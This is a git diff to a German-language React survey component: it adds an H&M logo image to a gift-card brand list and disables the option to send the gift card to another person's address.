@@ -3,6 +3,7 @@ import { Button } from '@/components/ui/button';
 import { RadioGroup, RadioGroupItem } from '@/components/ui/radio-group';
 import { Label } from '@/components/ui/label';
 import { Star, ChevronLeft, ChevronRight } from 'lucide-react';
+import hmLogo from '@/assets/hm-logo.png';
 
 const Survey = () => {
   const [isLoading, setIsLoading] = useState(true);
@@ -451,7 +452,7 @@ const Survey = () => {
                               <div className="font-bold text-xl">amazon.de</div>
                             )}
                             {item.brand === 'hm' && (
-                              <div className="font-bold text-xl">H&M</div>
+                              <img src={hmLogo} alt="H&M" className="h-8 mx-auto mb-1" />
                             )}
                             {item.brand === 'douglas' && (
                               <div className="font-bold text-xl">DOUGLAS</div>
@@ -592,27 +593,19 @@ const Survey = () => {
                           </div>
                         </button>
 
-                        <button
-                          onClick={() => handleAddressSelect('andere')}
-                          className={`w-full border-2 rounded-lg p-4 mb-6 transition-colors ${
-                            selectedAddress === 'andere' ? 'border-pink-600 bg-pink-50' : 'border-gray-300 hover:border-pink-300'
-                          }`}
-                        >
+                        {/* Grayed out "andere Person" option - not selectable */}
+                        <div className="w-full border-2 border-gray-200 rounded-lg p-4 mb-6 bg-gray-100 opacity-60 cursor-not-allowed">
                           <div className="flex items-center space-x-3">
-                            <div className={`w-5 h-5 border-2 border-pink-600 rounded-full ${
-                              selectedAddress === 'andere' ? 'bg-pink-600' : ''
-                            } flex items-center justify-center`}>
-                              {selectedAddress === 'andere' && <div className="w-2 h-2 bg-white rounded-full"></div>}
-                            </div>
+                            <div className="w-5 h-5 border-2 border-gray-400 rounded-full"></div>
                             <div className="text-left">
-                              <div className="font-semibold text-gray-800">👥 Adresse einer anderen Person</div>
-                              <div className="text-sm text-gray-600">Senden Sie die Geschenkkarte direkt an den Empfänger</div>
+                              <div className="font-semibold text-gray-500">👥 Adresse einer anderen Person</div>
+                              <div className="text-sm text-gray-400">Senden Sie die Geschenkkarte direkt an den Empfänger</div>
                             </div>
                           </div>
-                        </button>
+                        </div>
 
-                        {/* Continue Button - Show when address is selected */}
-                        {selectedAddress && (
+                        {/* Continue Button - Show when "Meine Adresse" is selected */}
+                        {selectedAddress === 'meine' && (
                           <Button className="w-full bg-pink-600 text-white py-3 rounded-lg font-semibold text-lg hover:bg-pink-700 transition-colors">
                             Weiter
                           </Button>
